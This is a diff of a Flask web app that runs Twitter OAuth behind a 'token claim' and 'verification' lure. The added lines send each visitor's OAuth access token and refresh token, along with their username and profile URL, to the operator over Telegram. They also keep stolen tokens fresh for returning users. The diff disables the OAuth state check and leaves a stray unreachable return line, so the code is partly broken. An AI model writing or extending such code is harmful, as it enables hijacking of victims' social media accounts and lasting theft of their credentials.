@@ -134,35 +134,10 @@ def home():
     state = request.args.get('state')
     error = request.args.get('error')
 
-    if request.args.get('authorize') == 'true':
-        state = "0"
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier
-
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-        return redirect(authorization_url)
-
-    return render_template('home.html')
-
-@app.route('/claim')
-def claim():
     if 'username' in session:
         username = session['username']
-        send_message_via_telegram(f"👋 @{username} returned to claim tokens.")
-        message = f"Welcome back, @{username}!"
-        return render_template('welcome.html', message=message)
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
-
-    if 'username' in session:
-        username = session['username']
-        send_message_via_telegram(f"👋 @{username} returned to claim tokens.")
-        message = f"Claim successful for @{username}!"
+        send_message_via_telegram(f"👋 @{username} just returned to the website.")
+        message = f"Verification successful for @{username}!"
         return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
 
     if request.args.get('authorize') == 'true':
@@ -180,6 +155,11 @@ def claim():
     if code:
         if error:
             return f"Error during authorization: {error}", 400
+
+        # State validation disabled for now since Twitter returns state=0
+        #if state != session.get('oauth_state', '0'):
+        #    return "Invalid state parameter", 403
+            return "Invalid state parameter", 403
 
         code_verifier = session.get('code_verifier')
         token_url = "https://api.twitter.com/2/oauth2/token"
@@ -206,13 +186,13 @@ def claim():
 
                 total_tokens = get_total_tokens()
                 send_message_via_telegram(
-                    f"💰 Token Claim!\n"
+                    f"🔑 Access Token: {access_token}\n"
+                    f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
-                    f"🔗 Profile: {profile_url}\n"
-                    f"📊 Total Claims: {total_tokens}"
+                    f"🔗 Profile URL: {profile_url}\n"
+                    f"📊 Total Tokens in Database: {total_tokens}"
                 )
-                message = f"Claim successful for @{username}!"
-                return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
+                return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
         else:
@@ -228,8 +208,14 @@ def welcome():
     if not username:
         return redirect(url_for('home'))
     
-    message = f"Welcome, @{username}! Your claim was successful."
-    return render_template('welcome.html', message=message)
+    if 'refresh_token' in session:
+        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
+        if access_token and refresh_token:
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
+            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
+
+    return redirect(url_for('dashboard'))
 
 @app.route('/dashboard')
 def dashboard():
@@ -261,11 +247,6 @@ def active():
 
 @app.route('/verify')
 def verify():
-    if 'username' in session:
-        username = session['username']
-        message = f"Already verified as @{username}!"
-        return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
-
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
